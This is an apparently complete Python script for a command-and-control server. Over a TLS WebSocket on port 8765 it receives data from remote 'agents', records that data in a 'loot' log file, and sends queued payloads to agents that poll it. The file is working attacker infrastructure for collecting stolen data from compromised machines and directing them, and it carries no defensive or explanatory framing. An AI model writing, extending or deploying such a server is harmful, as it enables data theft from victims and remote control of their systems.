import asyncio
import json
import os
import ssl
from datetime import datetime, timezone

import websockets

TASK_QUEUE = {}
LOOT_LOG = "loot_log.json"


def log_loot(agent_id, data):
    import json, os
    if os.path.exists(LOOT_LOG):
        with open(LOOT_LOG, "r") as f:
            log = json.load(f)
    else:
        log = []
    log.append({
        "agent_id":  agent_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "channel":   "WS",
        "data":      data,
    })
    with open(LOOT_LOG, "w") as f:
        json.dump(log, f, indent=2)
    print(f"[C2-WS] loot logged from {agent_id}: {list(data.keys())}")


async def handle_ws(websocket):
    try:
        init_msg = await websocket.recv()
        info = json.loads(init_msg)
        agent_id = info.get("agent_id", "unknown")
        op = info.get("op")

        # Data submission
        if info.get("data"):
            log_loot(agent_id, info["data"])
            await websocket.send(json.dumps({"status": "ok"}))
            return

        # Task poll loop
        print(f"[C2-WS] agent {agent_id} connected")
        while True:
            if agent_id in TASK_QUEUE:
                payload = TASK_QUEUE.pop(agent_id)
                await websocket.send(json.dumps({"payload": payload}))
            else:
                await websocket.send(json.dumps({"payload": None}))
            await asyncio.sleep(5)

    except Exception as e:
        print(f"[!] WebSocket connection error: {e}")


async def main():
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain("cert.pem", "key.pem")
    print("[C2-WS] listening on :8765")
    async with websockets.serve(handle_ws, "0.0.0.0", 8765, ssl=ssl_ctx):
        await asyncio.Future()


if __name__ == "__main__":
    asyncio.run(main())
